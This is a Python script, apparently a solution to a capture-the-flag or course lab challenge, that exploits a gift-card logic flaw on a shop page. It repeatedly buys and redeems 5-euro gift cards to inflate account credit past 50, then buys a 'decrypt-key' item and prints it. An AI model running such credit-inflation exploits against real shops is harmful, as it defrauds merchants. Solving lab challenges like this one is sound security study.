import requests
from lxml import html

session = requests.session()


domain = "https://cod.alviano.org/eshop/gift/"

def get_csrf():
    response = session.get(domain)
    tree = html.fromstring(response.content)
    

    found = tree.xpath(f"//input[@name = 'csrfmiddlewaretoken']/@value")

    return found[0] if len(found) > 0 else None


def buy_something(product):
    
    token = get_csrf()
    response = session.post(domain, data={
        "csrfmiddlewaretoken": token,
        "product": product
    }, headers={
        "referer": domain
    })


def get_gift_card_code_credit():
    response = session.get(domain)
    tree = html.fromstring(response.content)
    

    foundCode = tree.xpath(f"//div/ul/li/text()")
    foundCredit = tree.xpath(f"//div[@class = 'card-footer']/text()")
    c = int(foundCredit[0].strip().replace("Credit: € ",""))
    return foundCode[0].strip(),c


def get_key():
    response = session.get(domain)
    tree = html.fromstring(response.content)
    

    foundCode = tree.xpath(f"//div/p/text()")
    return foundCode[0]


def use_gift_card(code):
    token = get_csrf()
    response = session.post(domain, data={
        "csrfmiddlewaretoken": token,
        "redeem": code
    }, headers={
        "referer": domain
    })

while True:
    buy_something("gift-card-5-euro")
    code, credit = get_gift_card_code_credit()
    use_gift_card(code)

    if credit > 50:
        
        
        buy_something("decrypt-key")
        print(f"Code {get_key()}")

        break




    



